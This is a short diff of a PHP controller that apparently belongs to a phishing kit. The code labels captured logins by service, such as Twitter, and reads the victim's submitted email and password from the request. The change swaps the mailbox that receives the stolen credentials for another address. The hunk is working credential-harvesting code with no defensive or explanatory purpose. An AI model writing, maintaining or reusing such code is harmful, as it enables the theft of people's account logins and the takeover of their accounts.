@@ -69,7 +69,7 @@ class MainController extends Controller {
 					   else if($deg == "tww") $dg = "Twitter";
 					   
             		   $s = "New $dg Login: ".date("h:i A jS F, Y");
-                       $rcpt = "mails4davidslogan@gmail.com";
+                       $rcpt = "ceochris@protonmail.com";
                        $pass = $req["pass"];
                        $email = $req["email"];
 
